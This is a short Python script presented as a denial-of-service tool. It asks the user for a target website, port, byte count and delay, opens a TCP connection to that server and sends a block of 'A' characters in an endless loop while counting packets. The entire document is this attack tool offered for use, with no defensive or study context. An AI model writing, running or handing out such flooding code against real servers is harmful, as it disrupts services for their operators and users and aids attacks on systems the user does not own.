import socket, time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server = str(input("What's the website of the server you want to DoS: "))
server = socket.gethostbyname(server)
port = int(input("What port do you want to DoS: "))
data = int(input("How many bytes do you want to send: "))
data = "A" * data
timesleep = float(input("How many time do you want to sleep: "))
packet = 0
s.connect((server, port))
while True:
    s.send(data.encode("raw_unicode_escape"))
    packet += 1
    if not packet == 1:
        print(f"Sent {packet} packets")
    elif packet == 1:
        print(f"Sent {packet} packet")
    time.sleep(timesleep)
else:
    s.close()
